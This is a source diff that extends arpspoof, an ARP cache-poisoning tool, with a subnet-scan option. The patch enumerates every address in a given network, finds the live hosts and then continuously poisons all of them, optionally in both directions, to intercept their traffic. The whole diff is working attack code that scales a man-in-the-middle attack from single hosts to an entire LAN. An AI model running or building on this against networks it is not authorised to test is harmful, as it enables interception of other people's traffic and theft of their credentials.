@@ -27,21 +27,27 @@
 #include "arp.h"
 #include "version.h"
 
+/* time to wait between ARP packets */
+#define ARP_PAUSE 100000
+
 extern char *ether_ntoa(struct ether_addr *);
 
 struct host {
 	in_addr_t ip;
 	struct ether_addr mac;
+	uint8_t active;
 };
 
 static libnet_t *l;
 static struct host spoof = {0};
+static int n_targets = 0;
 static struct host *targets;
 static char *intf;
 static int poison_reverse;
 
 static uint8_t *my_ha = NULL;
 static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";
+static uint8_t *zero_ha = "\0\0\0\0\0\0";
 
 static int cleanup_src_own = 1;
 static int cleanup_src_host = 0;
@@ -50,7 +56,7 @@ static void
 usage(void)
 {
 	fprintf(stderr, "Version: " VERSION "\n"
-		"Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host\n");
+		"Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-s network/prefixlength] [-r] host\n");
 	exit(1);
 }
 
@@ -130,7 +136,7 @@ arp_find(in_addr_t ip, struct ether_addr *mac)
 #else
 		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
 #endif
-		sleep(1);
+		usleep(10000);
 	}
 	while (i++ < 3);
 
@@ -149,6 +155,31 @@ static int arp_find_all() {
 	return 0;
 }
 
+static int target_add(in_addr_t addr) {
+	targets[n_targets].ip = addr;
+	targets[n_targets].active = 0;
+	targets[n_targets+1].ip = (uint32_t)0;
+	return n_targets++;
+}
+
+static int arp_scan(in_addr_t addr, int prefix_length) {
+	uint32_t mask = ~((1<<(32-prefix_length))-1);
+	uint32_t net = (ntohl((uint32_t)addr)) & mask;
+	uint32_t brd = (ntohl((uint32_t)addr)) | ~mask;
+	uint32_t a;
+	for (a = net+1; a<brd; a++) {
+		in_addr_t ia = (in_addr_t) htonl(a);
+		target_add(ia);
+	}
+}
+
+static int active_targets(void) {
+	int n = 0;
+	struct host *target = targets;
+	for (; target->ip; target++) if (target->active) n++;
+	return n;
+}
+
 static void
 cleanup(int sig)
 {
@@ -160,8 +191,11 @@ cleanup(int sig)
 	fprintf(stderr, "Cleaning up and re-arping targets...\n");
 	for (i = 0; i < rounds; i++) {
 		struct host *target = targets;
-		while(target->ip) {
+		for(;target->ip;target++) {
 			uint8_t *src_ha = NULL;
+
+			if (!target->active) continue;
+
 			if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
 				src_ha = my_ha;
 			}
@@ -173,7 +207,7 @@ cleanup(int sig)
 					 target->ip,
 					 src_ha);
 				/* we have to wait a moment before sending the next packet */
-				sleep(1);
+				usleep(ARP_PAUSE);
 			}
 			if (bw) {
 				arp_send(l, ARPOP_REPLY,
@@ -181,9 +215,8 @@ cleanup(int sig)
 					 (u_int8_t *)&spoof.mac,
 					 spoof.ip,
 					 src_ha);
-				sleep(1);
+				usleep(ARP_PAUSE);
 			}
-			target++;
 		}
 	}
 
@@ -198,8 +231,11 @@ main(int argc, char *argv[])
 	char pcap_ebuf[PCAP_ERRBUF_SIZE];
 	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
 	int c;
-	int n_targets;
+	int n_scan_targets = 0;
+	char *scan_prefix = NULL;
+	int scan_prefix_length = 32;
 	char *cleanup_src = NULL;
+	in_addr_t target_addr;
 
 	spoof.ip = 0;
 	intf = NULL;
@@ -209,17 +245,37 @@ main(int argc, char *argv[])
 	/* allocate enough memory for target list */
 	targets = calloc( argc+1, sizeof(struct host) );
 
-	while ((c = getopt(argc, argv, "ri:t:c:h?V")) != -1) {
+	while ((c = getopt(argc, argv, "ri:s:t:c:h?V")) != -1) {
 		switch (c) {
 		case 'i':
 			intf = optarg;
 			break;
 		case 't':
-			if ((targets[n_targets++].ip = libnet_name2addr4(l, optarg, LIBNET_RESOLVE)) == -1)
+			target_addr = libnet_name2addr4(l, optarg, LIBNET_RESOLVE);
+			if (target_addr == -1) {
 				usage();
+			} else {
+				target_add(target_addr);
+			}
 			break;
 		case 'r':
 			poison_reverse = 1;
+			break;
+		case 's':
+			scan_prefix = strchr(optarg, '/');
+			if (scan_prefix) {
+				*scan_prefix = '\0';
+				scan_prefix_length = atoi(scan_prefix+1);
+				if (scan_prefix_length < 0 || scan_prefix_length > 32) {
+					usage();
+				}
+			}
+			n_scan_targets += (1<<(32-scan_prefix_length));
+			/* we need some more memory to store the target data */
+			int mem = (argc+1 + n_scan_targets) * sizeof(struct host);
+			targets = realloc( targets, mem );
+			targets[n_targets].ip = (uint32_t)0;
+			arp_scan(inet_addr(optarg), scan_prefix_length);
 			break;
 		case 'c':
 			cleanup_src = optarg;
@@ -235,7 +291,7 @@ main(int argc, char *argv[])
 		usage();
 
 	if (poison_reverse && !n_targets) {
-		errx(1, "Spoofing the reverse path (-r) is only available when specifying a target (-t).");
+		errx(1, "Spoofing the reverse path (-r) is only available when specifying at least one target (-t/-s).");
 		usage();
 	}
 
@@ -271,12 +327,20 @@ main(int argc, char *argv[])
 	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
 		errx(1, "%s", libnet_ebuf);
 
+	printf("Looking up %d hw addresses...\n", n_targets);
 	struct host *target = targets;
-	while(target->ip) {
-		if (target->ip != 0 && !arp_find(target->ip, &target->mac))
-			errx(1, "couldn't arp for host %s",
-			libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
-		target++;
+	for (; target->ip; target++) {
+		int arp_status = arp_find(target->ip, &target->mac);
+		if (arp_status &&
+				/* just make sure we are not getting an empty or broadcast address */
+				(memcmp(&target->mac, zero_ha, sizeof(struct ether_addr)) != 0) &&
+				(memcmp(&target->mac, brd_ha, sizeof(struct ether_addr)) != 0)) {
+			target->active = 1;
+			printf("Found host %s: %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE), ether_ntoa((struct ether_addr *)&target->mac));
+		} else {
+			target->active = 0;
+			printf("Unable to find host %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
+		}
 	}
 
 	if (poison_reverse) {
@@ -290,21 +354,30 @@ main(int argc, char *argv[])
 		errx(1, "Unable to determine own mac address");
 	}
 
+	if (active_targets() == 0) {
+		errx(1, "No target hosts found.");
+	}
+
 	signal(SIGHUP, cleanup);
 	signal(SIGINT, cleanup);
 	signal(SIGTERM, cleanup);
 
 	for (;;) {
 		struct host *target = targets;
-		while(target->ip) {
-			arp_send(l, ARPOP_REPLY, my_ha, spoof.ip,
-				(target->ip ? (u_int8_t *)&target->mac : brd_ha),
-				target->ip,
-				my_ha);
-			if (poison_reverse) {
-				arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip, my_ha);
+		for(;target->ip; target++) {
+			if (!target->active) continue;
+			/* do not target our spoof host! */
+			if (target->ip != spoof.ip) {
+				arp_send(l, ARPOP_REPLY, my_ha, spoof.ip,
+					(target->ip ? (u_int8_t *)&target->mac : brd_ha),
+					target->ip,
+					my_ha);
+				usleep(ARP_PAUSE);
+				if (poison_reverse) {
+					arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&spoof.mac, spoof.ip, my_ha);
+					usleep(ARP_PAUSE);
+				}
 			}
-			target++;
 		}
 
 		sleep(2);
